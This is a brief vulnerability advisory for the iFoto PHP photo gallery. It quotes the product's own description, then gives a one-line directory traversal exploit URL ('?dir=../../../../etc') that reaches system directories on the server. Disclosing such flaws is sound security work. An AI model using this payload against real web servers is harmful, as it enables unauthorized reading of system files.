-- Description (by the author's page) --
This is yet another Web-based PHP photo gallery called, iFoto. iFoto use 90%
CSS-based layout and can be customize to use normal HTML layout. Using PHP
and GD2 library make this application an awesome yet simple web-based photo
gallery!


-- Exploit --
http://localhost/?dir=../../../../etc
